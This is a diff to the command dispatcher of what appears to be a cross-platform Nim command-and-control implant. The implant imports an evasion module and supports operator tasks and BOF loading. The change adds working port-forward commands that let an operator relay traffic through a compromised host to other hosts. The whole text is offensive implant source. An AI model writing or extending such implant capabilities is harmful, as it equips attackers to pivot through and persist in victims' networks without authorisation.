@@ -1,6 +1,6 @@
 ## Command dispatcher for Nim agent — Windows + Linux.
 import std/[os, osproc, strutils, strformat, json, random, base64, sequtils, times]
-import config, transport, evasion
+import config, transport, evasion, portfwd
 
 when defined(windows):
   import winim/lean, winim/inc/tlhelp32
@@ -2510,8 +2510,22 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       import std/posix
       t.sendResult(id, $getpid(), "")
 
-  of "PORTFWD_ADD", "PORTFWD_DEL", "PORTFWD_LIST":
-    t.sendResult(id, "(no active port forwards)", "")
+  of "PORTFWD_LIST":
+    t.sendResult(id, portfwdList(), "")
+
+  of "PORTFWD_ADD":
+    let (proto, lport, rhost, rport) = parsePortfwdArgs(args)
+    if proto == "" or lport == "" or rhost == "" or rport == "":
+      t.sendResult(id, "", "usage: [tcp|udp] <lport> <rhost> <rport>")
+    else:
+      t.sendResult(id, portfwdAdd(proto, lport, rhost, rport), "")
+
+  of "PORTFWD_DEL":
+    let (proto, lport) = parsePortfwdDelArgs(args)
+    if lport == "":
+      t.sendResult(id, "", "usage: [tcp|udp] <lport>")
+    else:
+      t.sendResult(id, portfwdDel(proto, lport), "")
 
   of "BOF_STORE_LOAD", "BOF_STORE_LIST", "BOF_STORE_UNLOAD":
     t.sendResult(id, "(bof store not supported in Nim agent — use BOF with payload)", "")
